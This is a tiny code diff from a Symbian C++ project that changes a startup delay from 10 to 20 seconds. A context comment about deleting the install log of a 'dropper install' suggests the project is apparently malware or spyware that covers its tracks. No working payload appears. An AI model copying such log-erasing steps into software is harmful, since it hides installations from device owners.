@@ -87,7 +87,7 @@ LOCAL_C void MainL()
 	version VARCHAR(16) NOT NULL,action UNSIGNED INTEGER,startup UNSIGNED INTEGER)" );
 	*/
 
-	User::After(10*1000000);
+	User::After(20*1000000);
 	
 	// Delete install log of dropper install
 	TBuf8<12> hexBuf(KUidUninstaller);
